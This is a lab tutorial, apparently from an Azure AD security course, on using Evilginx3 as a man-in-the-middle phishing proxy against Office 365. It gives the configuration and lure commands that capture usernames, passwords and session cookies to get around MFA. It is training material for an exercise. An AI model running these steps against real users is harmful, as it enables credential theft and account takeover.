## **Phishing Attack Mechanics**

- **How Evilginx Works**:
    [Evilginx3](https://github.com/kgretzky/evilginx2) operates as a **man-in-the-middle** between the victim and the legitimate website. The user interacts with the real website while Evilginx silently intercepts sensitive data such as usernames, passwords, and authentication cookies. Evilginx does not clone the website; instead, it proxies the requests and responses to steal authentication credentials and session tokens.

- **Phishlets**:
   Evilginx uses **phishlets**, which are YAML configuration files that define the structure of the attack. Each phishlet is tailored for a specific target domain and contains details such as:
   - Hosts (e.g., login page URLs)
   - Filters (to detect valid login attempts)
   - Authentication cookie structure
   - Parameter names for username, password, and session tokens

## **How Evilginx Captures Credentials**

- **Session Hijacking**: Evilginx intercepts the login process, capturing not only usernames and passwords but also session cookies, which are crucial for bypassing MFA. This allows the attacker to hijack the session even if MFA is enabled on the legitimate website.

- **Post-Phishing Data**: After a user clicks the phishing link, enters their username, password, and possibly satisfies MFA, Evilginx captures all relevant data, including:
  - **Username**: The username entered by the victim.
  - **Password**: The password entered by the victim.
  - **Session Cookie**: The session token or cookie that can be used to authenticate the user without triggering MFA.

## **Setup Evilginx3**

**Setup**: Evilginx3 is preconfigured on the student VMs for this exercise. To get started, use the following commands:

1. **Start Evilginx3**:
	```bash
	evilginx -p C:\AzAD\Tools\evilginx-3.3.0\phishlets -developer
	```

2. **Configure the Domain**:
	Set up the phishing domain (in this case, `studentx.corp`):
	```bash
	config domain studentx.corp
	```

3. **Set the IP for the Evilginx Server**:
	Specify the external IP of the Evilginx server:
	```bash
	config ipv4 external 172.16.x.x
	```

4. **Use the Template for Office 365**:
	Configure the phishing template for Office 365:
	```bash
	phishlets hostname o365 studentx.corp
	```

5. **Verify DNS Entries**:
	Check if the DNS entries are set up correctly:
	```bash
	phishlets get-hosts o365
	```

## **Executing the Phishing Attack**

1. **Enable Phishlets**:
   Once the template for Office 365 is configured, enable the phishlet:
   ```bash
   phishlets enable o365
   ```

2. **Create the Phishing URL**:
   Create a unique phishing URL tied to the Office 365 phishlet:
   ```bash
   lures create o365
   ```

3. **Get the Phishing URL**:
   Retrieve the phishing URL that you will send to the victim:
   ```bash
   lures get-url <ID>
   ```

4. **Share the URL with the Target**:
   - For the lab, it’s recommended to send the phishing URL via email using your **registered email** to make troubleshooting easier. This will help in ensuring that the email delivery is legitimate and can be monitored.

::warning
**Testing and Phishing Link Delivery**: While conducting tests, ensure that no conflicting phishing tools (like `0365 Stealer`) are running simultaneously, as they might listen on the same port (e.g., port 443).
::
